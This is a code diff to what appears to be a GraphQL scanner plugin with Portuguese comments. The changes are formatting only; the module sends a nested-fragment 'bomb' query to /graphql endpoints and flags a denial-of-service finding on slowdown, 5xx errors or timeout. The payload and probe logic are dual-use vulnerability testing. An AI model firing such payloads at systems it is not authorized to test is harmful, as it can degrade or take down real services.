@@ -16,10 +16,7 @@ def run(target, ip, ports, banners):
     endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
     base_url = f"https://{target}" if target else f"http://{ip}"
 
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Cascavel-GraphQL-Probe/3.0.1"
-    }
+    headers = {"Content-Type": "application/json", "User-Agent": "Cascavel-GraphQL-Probe/3.0.1"}
 
     # Payload desenhado para estourar o AST Depth e o Resolving Engine
     # Se o limitador de depth não estiver ativo, isso trava o server.
@@ -27,9 +24,7 @@ def run(target, ip, ports, banners):
         "query": "query { ...a } fragment a on Query { ...b } fragment b on Query { ...c } fragment c on Query { ...d } fragment d on Query { __typename }"
     }
 
-    baseline_payload = {
-        "query": "{ __typename }"
-    }
+    baseline_payload = {"query": "{ __typename }"}
 
     for endpoint in endpoints:
         url = f"{base_url}{endpoint}"
@@ -50,25 +45,25 @@ def run(target, ip, ports, banners):
 
             # Se a bomba demorar 5x mais que o baseline e retornar Erro HTTP 50x (e não apenas bloqueio WAF 4xx)
             if bomb_time > (baseline_time * 5) and bomb_resp.status_code >= 500:
-                 finding = {
+                finding = {
                     "vulnerability": "GraphQL AST Overload DoS",
                     "severity": "HIGH",
                     "description": f"Endpoint GraphQL vulnerável à exaustão de recursos do AST. Um request intencionalmente complexo elevou o tempo de resposta de {baseline_time:.2f}s para {bomb_time:.2f}s, resultando em erro {bomb_resp.status_code}.",
                     "endpoint": endpoint,
-                    "payload": bomb_payload["query"]
+                    "payload": bomb_payload["query"],
                 }
-                 break
+                break
 
         except requests.exceptions.Timeout:
-             # Timeout também indica que a bomba funcionou.
-             finding = {
-                    "vulnerability": "GraphQL AST Overload DoS (Timeout)",
-                    "severity": "HIGH",
-                    "description": "Endpoint GraphQL sucumbiu a injeção de fragmento, resultando em Timeout da conexão.",
-                    "endpoint": endpoint,
-                    "payload": bomb_payload["query"]
-             }
-             break
+            # Timeout também indica que a bomba funcionou.
+            finding = {
+                "vulnerability": "GraphQL AST Overload DoS (Timeout)",
+                "severity": "HIGH",
+                "description": "Endpoint GraphQL sucumbiu a injeção de fragmento, resultando em Timeout da conexão.",
+                "endpoint": endpoint,
+                "payload": bomb_payload["query"],
+            }
+            break
         except Exception:
             pass
 
